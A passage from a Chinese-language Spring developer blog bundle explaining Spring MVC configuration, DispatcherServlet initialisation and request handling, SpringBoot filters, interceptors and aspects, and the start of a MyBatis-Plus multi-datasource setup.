认war包 --\x3e\n    <packaging>war</packaging>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n        <project.build.sourceencoding>utf-8</project.build.sourceencoding>\n    </properties>\n\n    <dependencies>\n        \x3c!-- 只使用mvc --\x3e\n        <dependency>\n            <groupid>org.springframework</groupid>\n            <artifactid>spring-webmvc</artifactid>\n        </dependency>\n    </dependencies>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n 2. 创建 webapp/web-inf 目录，并创建 web.xml 文件\n\n<?xml version="1.0" encoding="utf-8"?>\n\x3c!-- 这个文件是tomcat要去读取的文件，文件路径必须在 webapp/web-inf 下，webapp和 java是同级目录 --\x3e\n<web-app>\n    <servlet>\n        <servlet-name>app</servlet-name>\n        <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n        <init-param>\n            <param-name>contextconfiglocation</param-name>\n            \x3c!-- 指定spring.xml地址 --\x3e\n            <param-value>/web-inf/spring.xml</param-value>\n        </init-param>\n        \x3c!--数字只是决定初始化顺序\n            默认负数：客户端第一次访问才初始化\n            大于零：的数表示服务器启动时，初始化\n            数字越小越先初始化\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app</servlet-name>\n        \x3c!-- 访问路径前缀 --\x3e\n        <url-pattern>/app/*</url-pattern>\n    </servlet-mapping>\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 3. 创建 /web-inf/spring.xml 文件\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd">\n\n    <context:component-scan base-package="com.fengqianrun.mvc" />\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 4. 配置 tomcat，deployment 中配置 war，并修改 application context\n 5. 访问 url\n\n访问地址为 http://ip:port/tomcat配置的application context/web.xml里的servlet-name/controller/method\n\n\n1\n\n\n\n# dispatcherservlet 初始化讲解\n\ndispatcherservlet 继承自 httpservletbean，其最终父类还是 servlet，只是实现了规范，重写了一些方法。 比如 httpservletbean 该类重写了 init () 方法，在启动指定 dispatcherservlet 的时候，会调用被重写的 init 方法。整体 init 流程如下：\n\n整个 dispatcherservlet 加载流程：\n1. tomcat会调用servlet的init()方法\n2. httpservletbean重写了init()方法\n    2.1 读取web.xml里面的内容并封装\n    2.2 执行核心 initservletbean() 方法\n    2.3 initservletbean() 方法调用 initwebapplicationcontext()\n3. initwebapplicationcontext 方法，用于创建 context 上下文\n    3.1 调用findwebapplicationcontext()查询 web.xml 是否自定义了 contextattribute 这个属性\n    3.2 没用自定义则 createwebapplicationcontext(rootcontext) 创建 org.springframework.web.context.support.xmlwebapplicationcontext 实例，并跟父容器绑定。\n    3.3 给 context 设置环境信息 wac.setenvironment(getenvironment());\n    3.4 设置定义 contextconfiglocation(/web-inf/spring.xml) 的路径\n    3.5 调用 configureandrefreshwebapplicationcontext() 方法\n4. configureandrefreshwebapplicationcontext 方法，配置context上下文，并初始化bean\n    4.1 设置上下文 id，为`应用名称`+`servlet-name`\n    4.2 把已有的上下文(cotent)以及配置(config)设置到新的context中\n    4.3 给新的context添加一个applicationlistener，主要为 contextrefreshlistener，当上下文刷新完毕后通知，该类被通知会调用 **frameworkservlet.this.onapplicationevent(event);** 方法，这个方法很重要\n    4.4 调用 refresh() 方法，执行 bean 的初始化操作（spring那一套），执行完调用 this.finishrefresh(); 也就通知到 4.3 中的 contextrefreshlistener对象并调用 frameworkservlet.this.onapplicationevent(event);\n5. frameworkservlet.this.onapplicationevent(event);调用到dispatcherservlet.initstrategies()方法并会执行以下各种方法： \n    initmultipartresolver(context);\n    initlocaleresolver(context);\n    initthemeresolver(context);\n    inithandlermappings(context); \n    inithandleradapters(context);\n    inithandlerexceptionresolvers(context);\n    initrequesttoviewnametranslator(context);\n    initviewresolvers(context);\n    initflashmapmanager(context);\n6. inithandlermappings，用于把已经加载到spring容器的对象进行挑拣，把实现了 @requestmapping | @controller 的bean摘出来并得到所有实现了@requestmapping注解的方法 注册到 mappingregister 容器中\n    6.1 从容器中读取到实现了handlermapping.class 的bean，这里就是找我们自定义实现了handlermapping.class的bean\n    6.2 如果没有自定义的 handlermapping，会加载默认的 handlermapping，默认有 beannameurlhandlermapping,requestmappinghandlermapping,routerfunctionmapping,把找到的注册到 bean容器中\n        6.2.1 requestmappinghandlermapping 在注册bean的时候会执行 afterpropertiesset()方法，该方法里面会得到所有bean，并判断类型是否是有 controller.class 或 requestmapping.class 注解，如果符合条件代表你是一个 controllerhandler\n        6.2.2 如果是一个 controllerhandler，则获取该类中的方法并得到有只含有requestmapping.class注解的方法，并且解析注解上的参数,把方法注册到一个 mappingregistry 里\n    6.3 beannameurlhandlermapping 是由 applicationcontextaware 感知调用初始化方法的\n        6.3.1 beannameurlhandlermapping 和 requestmappinghandlermapping 解析的方式不一样，beannameurlhandlermapping得到容器中所有bean，会判断beanname的前缀以 \'/\'开头并收集，并且注册到 handlermap中\n        6.3.2 beannameurlhandlermapping 和其他controller写法不一样，具体要给类加 @component("/test") 并且还有实现 implements controller\n        6.3.3 找到匹配条件的方法把他维护到自己的 handlermap 中\n    6.4 注意 beannameurlhandlermapping 和 requestmappinghandlermapping维护了不同的 handler 容器，所以相同的请求路径不会报错，如果相同，执行beannameurlhandlermapping的方法，因为优先级比requestmappinghandlermapping靠前\n7. inithandleradapters，初始化方法会先把所需要的准备好加载进去\n    7.1 inithandleradapters 从spring容器中找加了 @controlleradvice 的bean\n    7.2 得到bean后判断加了 @modelattribute 的注解但不包含有 @requestmapping注解的方法 存到 modelattributeadvicecache中\n    7.3 得到bean后判断加了 @initbinder 的方法 存到 initbinderadvicecache 中\n    7.4 从容其中得到所有实现 requestbodyadvice 或 responsebodyadvice 接口，记录下来\n    7.5 初始化 httprequesthandleradapter、simplecontrollerhandleradapter、requestmappinghandleradapter、handlerfunctionadapter\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# 父子容器\n\n父子容器，就是在一个 web.xml 里面指定两个 servlet，加载不同的 spring.xml，共享一个 listener 父容器的对象。注意：父容器是会在 servlet 节点之前解析的。父子容器具体实现如下：\n\n<?xml version="1.0" encoding="utf-8"?>\n\x3c!-- 这个文件是tomcat要去读取的文件，文件路径必须在 webapp/web-inf 下，webapp和 java是同级目录 --\x3e\n<web-app>\n    \n    \x3c!-- 父容器 --\x3e\n    <listener>\n        <listener-class>org.springframework.web.context.contextloaderlistener</listener-class>\n    </listener>\n\n    <context-param>\n        <param-name>contextconfiglocation</param-name>\n        \x3c!-- 描述bean的文件 --\x3e\n        <param-value>/web-inf/spring2.xml</param-value>\n    </context-param>\n\n    \x3c!-- 子1 --\x3e\n    <servlet>\n        <servlet-name>app</servlet-name>\n        <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n        <init-param>\n            <param-name>contextconfiglocation</param-name>\n            \x3c!-- 指定spring.xml地址 --\x3e\n            <param-value>/web-inf/spring.xml</param-value>\n        </init-param>\n        \x3c!--数字只是决定初始化顺序\n            默认负数：客户端第一次访问才初始化\n            大于零：的数表示服务器启动时，初始化\n            数字越小越先初始化\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app</servlet-name>\n        \x3c!-- 访问路径前缀 --\x3e\n        <url-pattern>/app/*</url-pattern>\n    </servlet-mapping>\n\n    \x3c!-- 子2 --\x3e\n    <servlet>\n        <servlet-name>app1</servlet-name>\n        <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n        <init-param>\n            <param-name>contextconfiglocation</param-name>\n            \x3c!-- 指定spring.xml地址 --\x3e\n            <param-value>/web-inf/spring1.xml</param-value>\n        </init-param>\n        \x3c!--数字只是决定初始化顺序\n            默认负数：客户端第一次访问才初始化\n            大于零：的数表示服务器启动时，初始化\n            数字越小越先初始化\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app1</servlet-name>\n        \x3c!-- 访问路径前缀 --\x3e\n        <url-pattern>/app1/*</url-pattern>\n    </servlet-mapping>\n\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\ncontextloaderlistener 会创建一个容器 applicationcontext，解析配置的 xml 文件，走 spring 常规的 bean 加载流程。 这个 applicationcontext 会被做为 servlet 的父容器被加载到 servletcontext（map）中，当 servlet 被加载的时候会和父容器进行绑定，详见 dispatcherservlet 初始化讲解 3.2\n\n\n# 代码取代 xml 配置\n\n整体和 xml 是差不多的\n\npublic class mywebapplicationinitializer implements webapplicationinitializer {\n    \n    @override\n    public void onstartup(servletcontext servletcontext) throws servletexception {\n        // load spring web application configuration\n        annotationconfigwebapplicationcontext context = new annotationconfigwebapplicationcontext();\n        context.register(appconfig.class);\n\n        // create and register the dispatcherservlet\n        dispatcherservlet servlet = new dispatcherservlet(context);\n        servletregistration.dynamic registration = servletcontext.addservlet("app", servlet);\n        registration.setloadonstartup(1);\n        registration.addmapping("/app/*");\n    }\n\n    @componentscan("com.fengqianrun.mvc")\n    public class appconfig{\n\n    }\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nmywebapplicationinitializer 被加载是通过 springservletcontainerinitializer 实现了 servletcontainerinitializer 的规范，在 springservletcontainerinitializer 中有一个 @handlestypes，里面就定义了 webapplicationinitializer，会把该类加载传入 springservletcontainerinitializer 的 onstartup 方法，该方法里面继续调用实现了 webapplicationinitializer 的 onstartup 方法\n\n\n# 请求实现\n\n我们都知道早出写一个 httpservlet 并实现 service () 转发具体 doget dopost 并实现业务逻辑。dispatcherservlet 一样实现了 httpservlet 并重写了 service、doget、dopost 等方法，实现具体流程是：\n\n1. 由dispatcherservlet的父类frameworkservlet具体实现了service、doget、dopost方法\n2. frameworkservlet会先被调用service()方法，解析方法的请求方式是 get 还是 post，后调用httpservlet的service()方法进一步判断是调用 doget 还是 dopost方法\n3. httpservlet在调用frameworkservlet具体实现了doget或dopost方法\n    3.1 \n4. dopost实现会调用frameworkservlet的子类dispatcherservlet的doservice方法\n    4.1 doservice 首先会打印请求的信息\n    4.2 把context添加到 request 的请求中\n    4.3 flashmapmanager\n    4.4 调用 dodispatch 方法\n5. dodispatch\n    5.1 得到默认的三个 mapping（ beannameurlhandlermapping,requestmappinghandlermapping,routerfunctionmapping，详细在dispatcherservlet 初始化讲解6.2中）\n    5.2 便利每个 mapping，并得到请求的路径，根据路径去找 handler（这个handler就是dispatcherservlet 初始化讲解6.2.2的方法），如果是beannameurlhandlermapping找到的是bean，requestmappinghandlermapping找到的是 hanlermethod 统一为 handler\n    5.3 找到handler后会封装为一个 handler执行链，这个执行链包含了拦截器，所以称为链\n    5.4 由于获取的 handler 是一个object，无法确定是beannameurlhandlermapping的bean还是requestmappinghandlermapping的handlermethod，所以执行 gethandleradapter 进行适配\n        5.4.1 把已经加载的 handleradapters 进行便利（dispatcherservlet 初始化讲解 7.5）\n        5.4.2 每个 handleradapter 实现方式不一样，会有个统一的 supports 方法来判断是否实现了不同 mapping 的要求，并找到合适的 adapter\n            5.4.2.1 如 requestmappinghandlermapping 对应的是 requestmappinghandleradapter，adapter 的 supports会判断是否是 handlermethod 的实例，是则得到这个 adapter\n        5.4.3 handler执行链开始执行拦截器，会遍历所有的拦截器执行执行前置方法，如果拦截器前置方法返回false则后面不在执行\n        5.4.4 拦截器执行完毕后就可以执行得到的 handleradapter 的 handler 方法，去真正执行 controller 的方法，返回值会封装成 modelandview\n            5.4.4.1 检查是否限制了请求方式，比如只支持 post 请求\n            5.4.4.2 判断是否开启session锁，用于对持有相同session的请求进行并发限制\n            5.4.4.3 执行invokehandlermethod方法\n                5.4.4.3.1 找出@initbinder创建一个 binderfactory 工厂，该工厂是对method请求参数做类型转换，找的是当前method或全局的@initbinder的转换器\n                5.4.4.3.2 生成modelfactory，把@modelattribute的key和value，以及@sessionattributes的key和value添加到 model中，可以保障在controller的model中得到数据\n                5.4.4.3.3 创建一个处理方法的对象，设置方法解析器（解析@requestparam等注解或对象），返回值解析器（比如加了@responsebody要解析成json），设置binderfactory\n                5.4.4.3.4 创建 modelandviewcontainer，给modelandviewcontainer 添加解析的内容（初始化），然后具体去执行 invokandhandler(req,modelandviewcontainer)，得到更多的信息给 modelandviewcontainer，比如返回结果\n                5.4.4.3.5 最后对 modelandviewcontainer 进行处理，判断当前请求是否进行了重定向\n        5.4.5 通过返回的 modelandview 查找并设置视图\n        5.4.6 执行拦截器后置方法\n        5.4.7 视图渲染\n        5.4.8 再调用拦截的执行完成方法\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n',charsets:{cjk:!0}},{title:"SpringBoot 之 Filter、Interceptor、Aspect",frontmatter:{title:"SpringBoot 之 Filter、Interceptor、Aspect",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/200/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/03.spring%20boot/200.SpringBoot%20%E4%B9%8B%20Filter%E3%80%81Interceptor%E3%80%81Aspect.html",relativePath:"01.框架/01.Spring/03.spring boot/200.SpringBoot 之 Filter、Interceptor、Aspect.md",key:"v-3002ba14",path:"/spring/spring-boot/200/",headers:[{level:2,title:"Filter 过滤器",slug:"filter-过滤器",normalizedTitle:"filter 过滤器",charIndex:140},{level:3,title:"第一种",slug:"第一种",normalizedTitle:"第一种",charIndex:192},{level:3,title:"第二种",slug:"第二种",normalizedTitle:"第二种",charIndex:971},{level:2,title:"Interceptor 拦截器",slug:"interceptor-拦截器",normalizedTitle:"interceptor 拦截器",charIndex:1678},{level:3,title:"一、实现HandlerInterceptor接口",slug:"一、实现handlerinterceptor接口",normalizedTitle:"一、实现 handlerinterceptor 接口",charIndex:1798},{level:3,title:"二、注册到InterceptorRegistration",slug:"二、注册到interceptorregistration",normalizedTitle:"二、注册到 interceptorregistration",charIndex:3314},{level:2,title:"Aspect 切面",slug:"aspect-切面",normalizedTitle:"aspect 切面",charIndex:4229}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Filter 过滤器 第一种 第二种 Interceptor 拦截器 一、实现HandlerInterceptor接口 二、注册到InterceptorRegistration Aspect 切面",content:'springboot 提供了集中拦截机制，可以方便我们在业务层进行扩展，熟悉的有 filter、interceptor、Aspect。像 ControllerAdvice 仅用于处理 controller 异常事比较多的，所以再次不过多介绍。下图介绍了机制所在层次：\n\n\n\n\n# Filter 过滤器\n\n实现方式有两种，过滤器无法获得上下文、值栈里的对象，并对所有请求起作用\n\n\n# 第一种\n\n实现 Filter 接口\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\n\nimport javax.servlet.*;\nimport java.io.IOException;\n\n@Component\n@Slf4j\npublic class MyFilter implements Filter {\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n        log.info("初始化");\n    }\n\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        log.info("执行");\n        filterChain.doFilter(servletRequest,servletResponse);\n    }\n\n    @Override\n    public void destroy() {\n        log.info("销毁");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 第二种\n\n配置到 Bean\n\npackage com.wt.cloud.config;\n\nimport com.wt.cloud.filter.MyFilter;\nimport org.springframework.boot.web.servlet.FilterRegistrationBean;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\nimport java.util.Arrays;\n\n@Configuration\npublic class FilterConfig {\n\n    @Bean\n    public FilterRegistrationBean myFilter(){\n        FilterRegistrationBean filterRegistrationBean = new FilterRegistrationBean();\n        filterRegistrationBean.setFilter(new MyFilter());\n        filterRegistrationBean.setUrlPatterns(Arrays.asList("/*"));\n        return filterRegistrationBean;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# Interceptor 拦截器\n\n拦截器可以获取 IOC 容器中的各个 bean, 拦截器是基于 java 的反射机制的，拦截器只能对 action 请求起作用，拦截器可以访问 action 上下文、值栈里的对象，但无法获取参数。\n\n\n# 一、实现 HandlerInterceptor 接口\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\nimport org.springframework.web.servlet.HandlerInterceptor;\nimport org.springframework.web.servlet.ModelAndView;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@Slf4j\n@Component\npublic class MyInterceptor implements HandlerInterceptor{\n\n    /**\n     * 功能描述: 执行方法前\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @Override\n    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n        log.info("执行方法前");\n        return false;\n    }\n\n    /**\n     * 功能描述: 执行方法后，有异常不执行\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @Override\n    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {\n        log.info("执行方法后，有异常不执行");\n    }\n\n    /**\n     * 功能描述: 执行完一定会执行\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @Override\n    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {\n        log.info("执行完一定会执行");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# 二、注册到 InterceptorRegistration\n\npackage com.wt.cloud.config;\n\nimport com.wt.cloud.filter.MyInterceptor;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.web.servlet.config.annotation.InterceptorRegistration;\nimport org.springframework.web.servlet.config.annotation.InterceptorRegistry;\nimport org.springframework.web.servlet.config.annotation.WebMvcConfigurer;\n\n\n@Configuration\npublic class InterceptorConfig implements WebMvcConfigurer{\n\n    @Override\n    public void addInterceptors(InterceptorRegistry registry) {\n        //註冊TestInterceptor拦截器 new 或者 注入 都行\n        InterceptorRegistration registration = registry.addInterceptor(new MyInterceptor());\n        //所有路径都被拦截\n        registration.addPathPatterns("/**");\n        //添加不拦截路径\n        registration.excludePathPatterns("/","/error","/static/**");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# Aspect 切面\n\nAspect 可以自定义要切入的类甚至再细的方法，粒度最小。\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.Slf4j;\nimport org.aspectj.lang.JoinPoint;\nimport org.aspectj.lang.ProceedingJoinPoint;\nimport org.aspectj.lang.annotation.*;\nimport org.springframework.stereotype.Component;\n\n@Aspect\n@Component\n@Slf4j\npublic class MyAspect {\n\n//    @Before("execution(* com.wt.cloud.web.HelloWeb.*(..))")\n//    public void Before(JoinPoint point){\n//        log.info("执行前");\n//    }\n//    @After("execution(* com.wt.cloud.web.HelloWeb.*(..))")\n//    public void After(JoinPoint point){\n//        log.info("执行后");\n//    }\n//    @AfterThrowing("execution(* com.wt.cloud.web.HelloWeb.*(..))")\n//    public void AfterThrowing(JoinPoint point){\n//        log.info("执行异常");\n//    }\n\n    @Around("execution(* com.wt.cloud.web.HelloWeb.*(..))")\n    public Object Around(ProceedingJoinPoint point) throws Throwable {\n        log.info("MyAspect 环绕执行");\n        log.info("MyAspect 参数 ",point.getArgs());\n        Object obj = point.proceed();\n        log.info("MyAspect 执行完成结果 ",obj);\n        return obj;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n',normalizedContent:'springboot 提供了集中拦截机制，可以方便我们在业务层进行扩展，熟悉的有 filter、interceptor、aspect。像 controlleradvice 仅用于处理 controller 异常事比较多的，所以再次不过多介绍。下图介绍了机制所在层次：\n\n\n\n\n# filter 过滤器\n\n实现方式有两种，过滤器无法获得上下文、值栈里的对象，并对所有请求起作用\n\n\n# 第一种\n\n实现 filter 接口\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.slf4j;\nimport org.springframework.stereotype.component;\n\nimport javax.servlet.*;\nimport java.io.ioexception;\n\n@component\n@slf4j\npublic class myfilter implements filter {\n    @override\n    public void init(filterconfig filterconfig) throws servletexception {\n        log.info("初始化");\n    }\n\n    @override\n    public void dofilter(servletrequest servletrequest, servletresponse servletresponse, filterchain filterchain) throws ioexception, servletexception {\n        log.info("执行");\n        filterchain.dofilter(servletrequest,servletresponse);\n    }\n\n    @override\n    public void destroy() {\n        log.info("销毁");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 第二种\n\n配置到 bean\n\npackage com.wt.cloud.config;\n\nimport com.wt.cloud.filter.myfilter;\nimport org.springframework.boot.web.servlet.filterregistrationbean;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport java.util.arrays;\n\n@configuration\npublic class filterconfig {\n\n    @bean\n    public filterregistrationbean myfilter(){\n        filterregistrationbean filterregistrationbean = new filterregistrationbean();\n        filterregistrationbean.setfilter(new myfilter());\n        filterregistrationbean.seturlpatterns(arrays.aslist("/*"));\n        return filterregistrationbean;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# interceptor 拦截器\n\n拦截器可以获取 ioc 容器中的各个 bean, 拦截器是基于 java 的反射机制的，拦截器只能对 action 请求起作用，拦截器可以访问 action 上下文、值栈里的对象，但无法获取参数。\n\n\n# 一、实现 handlerinterceptor 接口\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.slf4j;\nimport org.springframework.stereotype.component;\nimport org.springframework.web.servlet.handlerinterceptor;\nimport org.springframework.web.servlet.modelandview;\n\nimport javax.servlet.http.httpservletrequest;\nimport javax.servlet.http.httpservletresponse;\n\n@slf4j\n@component\npublic class myinterceptor implements handlerinterceptor{\n\n    /**\n     * 功能描述: 执行方法前\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @override\n    public boolean prehandle(httpservletrequest request, httpservletresponse response, object handler) throws exception {\n        log.info("执行方法前");\n        return false;\n    }\n\n    /**\n     * 功能描述: 执行方法后，有异常不执行\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @override\n    public void posthandle(httpservletrequest request, httpservletresponse response, object handler, modelandview modelandview) throws exception {\n        log.info("执行方法后，有异常不执行");\n    }\n\n    /**\n     * 功能描述: 执行完一定会执行\n     * @return : boolean\n     * @author : big uncle\n     * @date : 2019/10/9 12:24\n     */\n    @override\n    public void aftercompletion(httpservletrequest request, httpservletresponse response, object handler, exception ex) throws exception {\n        log.info("执行完一定会执行");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n# 二、注册到 interceptorregistration\n\npackage com.wt.cloud.config;\n\nimport com.wt.cloud.filter.myinterceptor;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.web.servlet.config.annotation.interceptorregistration;\nimport org.springframework.web.servlet.config.annotation.interceptorregistry;\nimport org.springframework.web.servlet.config.annotation.webmvcconfigurer;\n\n\n@configuration\npublic class interceptorconfig implements webmvcconfigurer{\n\n    @override\n    public void addinterceptors(interceptorregistry registry) {\n        //註冊testinterceptor拦截器 new 或者 注入 都行\n        interceptorregistration registration = registry.addinterceptor(new myinterceptor());\n        //所有路径都被拦截\n        registration.addpathpatterns("/**");\n        //添加不拦截路径\n        registration.excludepathpatterns("/","/error","/static/**");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n\n# aspect 切面\n\naspect 可以自定义要切入的类甚至再细的方法，粒度最小。\n\npackage com.wt.cloud.filter;\n\nimport lombok.extern.slf4j.slf4j;\nimport org.aspectj.lang.joinpoint;\nimport org.aspectj.lang.proceedingjoinpoint;\nimport org.aspectj.lang.annotation.*;\nimport org.springframework.stereotype.component;\n\n@aspect\n@component\n@slf4j\npublic class myaspect {\n\n//    @before("execution(* com.wt.cloud.web.helloweb.*(..))")\n//    public void before(joinpoint point){\n//        log.info("执行前");\n//    }\n//    @after("execution(* com.wt.cloud.web.helloweb.*(..))")\n//    public void after(joinpoint point){\n//        log.info("执行后");\n//    }\n//    @afterthrowing("execution(* com.wt.cloud.web.helloweb.*(..))")\n//    public void afterthrowing(joinpoint point){\n//        log.info("执行异常");\n//    }\n\n    @around("execution(* com.wt.cloud.web.helloweb.*(..))")\n    public object around(proceedingjoinpoint point) throws throwable {\n        log.info("myaspect 环绕执行");\n        log.info("myaspect 参数 ",point.getargs());\n        object obj = point.proceed();\n        log.info("myaspect 执行完成结果 ",obj);\n        return obj;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n',charsets:{cjk:!0}},{title:"SpringBoot MyBatisPlus 实现多数据源",frontmatter:{title:"SpringBoot MyBatisPlus 实现多数据源",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/203/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/03.spring%20boot/203.SpringBoot%20MyBatisPlus%20%E5%AE%9E%E7%8E%B0%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%BA%90.html",relativePath:"01.框架/01.Spring/03.spring boot/203.SpringBoot MyBatisPlus 实现多数据源.md",key:"v-02fdbe47",path:"/spring/spring-boot/203/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'在 spring boot 整合中还是会出现问题。如下：\n\nDescription:\n\nFailed to configure a DataSource: \'url\' attribute is not specified and no embedded datasource could be configured.\n\n\n1\n2\n3\n\n\n只需要在 配置文件中加如下：\n\nspring:\n  autoconfigure:\n    exclude: com.alibaba.druid.spring.boot.autoconfigure.DruidDataSourceAutoConfigure\n\n\n1\n2\n3\n\n\n用的是 Druid 的数据源，所以排除 Druid 使用 spring boot 自带的。\n\n依赖\n\n\x3c!-- 数据持久相关配置 --\x3e\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>mybatis-plus-boot-starter</artifactId>\n    <version>${mybatis-plus}</version>\n</dependency>\n\n\x3c!-- 驱动 --\x3e\n<dependency>\n    <groupId>mysql</groupId>\n    <artifactId>mysql-connector-java</artifactId>\n</dependency>\n\n<dependency>\n    <groupId>com.alibaba</groupId>\n    <artifactId>druid-spring-boot-starter</artifactId>\n    <version>${db-drive}</version>\n</dependency>\n\n\x3c!-- 多数据源 --\x3e\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>dynamic-datasource-spring-boot-starter</artifactId>\n    <version>3.1.1</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n配置文件\n\nspring:\n  main:\n    allow-bean-definition-overriding: true\n  autoconfigure:\n    exclude: 